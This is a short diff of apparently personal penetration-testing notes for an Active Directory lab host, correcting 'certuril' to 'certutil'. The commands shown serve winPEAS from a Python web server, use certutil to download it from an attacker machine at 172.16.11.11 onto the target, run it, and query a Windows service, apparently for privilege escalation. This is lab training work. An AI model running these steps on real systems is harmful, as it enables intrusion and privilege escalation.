@@ -56,7 +56,7 @@ whoami /priv
 cd ~/Desktop/ad_lab/ms01/payloads
 mv /Downloads/winPEASx64.exe ./winpeas.exe
 python -m http.server 80
-certuril.exe -urlcache -f http://172.16.11.11/winpeas.exe winpeas.exe
+certutil.exe -urlcache -f http://172.16.11.11/winpeas.exe winpeas.exe
 winpeas.exe
 sc query | findstr /i wise
 sc qc wisebootassistant
